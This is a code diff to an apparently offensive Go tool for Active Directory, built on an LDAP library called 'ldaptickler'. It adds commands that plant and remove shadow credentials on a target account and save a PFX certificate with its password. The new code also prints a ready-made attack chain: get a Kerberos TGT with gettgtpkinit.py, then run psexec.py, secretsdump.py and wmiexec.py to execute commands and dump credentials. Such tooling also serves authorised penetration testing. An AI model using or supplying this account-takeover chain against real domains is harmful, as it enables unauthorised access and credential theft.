@@ -34,6 +34,8 @@ var lookupTable map[string]action = map[string]action{
 	"addloginscript":                 {call: addloginscript, numargs: 2, usage: "<username> <loginscript>"},
 	"addmachine":                     {call: addmachine, numargs: 2, usage: "<machinename> <password>"},
 	"addmachinelp":                   {call: addmachinelp, numargs: 3, usage: "<machinename> <password> <domain>"},
+	"addshadowcredential":            {call: addshadowcredential, numargs: 1, usage: "<username>"},
+	"removeshadowcredential":         {call: removeshadowcredential, numargs: 1, usage: "<username>"},
 	"addspn":                         {call: addspn, numargs: 2, usage: "<machinename> <spn>"},
 	"adduser":                        {call: adduser, numargs: 3, usage: "<username> <principalname> <password>"},
 	"certpublishers":                 {call: certpublishers, numargs: 0},
@@ -123,6 +125,8 @@ func init() {
 		"addloginscript <username> <scriptname>:: Adds a login script to an account\n",
 		"addmachine <machinename> <machinepass>::Adds a new machine to the domain\n",
 		"addmachinelp <machinename> <machinepass>::Adds a new machine using low-priv credentials\n",
+		"addshadowcredential <username>::Adds shadow credential and generates PFX file in current directory\n",
+		"removeshadowcredential <username>::Removes all shadow credentials from the account\n",
 		"addspn <accountname> <spn>::Adds an SPN to an account\n",
 		"adduser <username> <password>::Creates a new user\n",
 		"changepassword <accountname> <newpassword>::Changes the password for an account\n",
@@ -350,6 +354,54 @@ func addmachinelp(c *ldaptickler.Conn, args ...string) error {
 		return err
 	}
 	fmt.Printf("[+] Added machine account %s successfully with password %s\n", machinename, machinepass)
+	return nil
+}
+
+func addshadowcredential(c *ldaptickler.Conn, args ...string) error {
+	username := args[0]
+	outputDir := "."
+
+	fmt.Printf("[+] Generating shadow credential PFX for account %s\n", username)
+	pfxFile, pfxPass, credentialID, err := c.AddShadowCredentialWithPFX(username, outputDir)
+	if err != nil {
+		return err
+	}
+
+	fmt.Printf("[+] Successfully added shadow credential to account %s\n", username)
+	fmt.Printf("[+] Credential ID: %s\n", credentialID)
+	fmt.Printf("[+] PFX file saved to: %s\n", pfxFile)
+	fmt.Printf("[+] PFX password: %s\n\n", pfxPass)
+
+	// Display ready-to-use command
+	fmt.Printf("[*] Ready to use with gettgtpkinit.py:\n")
+	fmt.Printf("    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' DOMAIN/%s output.ccache\n\n", pfxFile, pfxPass, username)
+
+	// Alternative with DC specification
+	fmt.Printf("[*] With specific DC:\n")
+	fmt.Printf("    python3 gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' -dc-ip <DC_IP> DOMAIN/%s output.ccache\n\n", pfxFile, pfxPass, username)
+
+	// After obtaining TGT
+	fmt.Printf("[*] After obtaining the TGT:\n")
+	fmt.Printf("    export KRB5CCNAME=output.ccache\n")
+	fmt.Printf("    klist\n\n")
+
+	// Use the TGT
+	fmt.Printf("[*] Use the TGT with impacket tools:\n")
+	fmt.Printf("    psexec.py -k -no-pass DOMAIN/hostname\n")
+	fmt.Printf("    secretsdump.py -k -no-pass DOMAIN/hostname\n")
+	fmt.Printf("    wmiexec.py -k -no-pass DOMAIN/hostname\n\n")
+
+	return nil
+}
+
+func removeshadowcredential(c *ldaptickler.Conn, args ...string) error {
+	username := args[0]
+	fmt.Printf("[+] Removing shadow credentials for account %s\n", username)
+	if err := c.RemoveShadowCredentials(username); err != nil {
+		return err
+	}
+	fmt.Printf("[+] Successfully removed shadow credentials from account %s\n", username)
+
 	return nil
 }
 
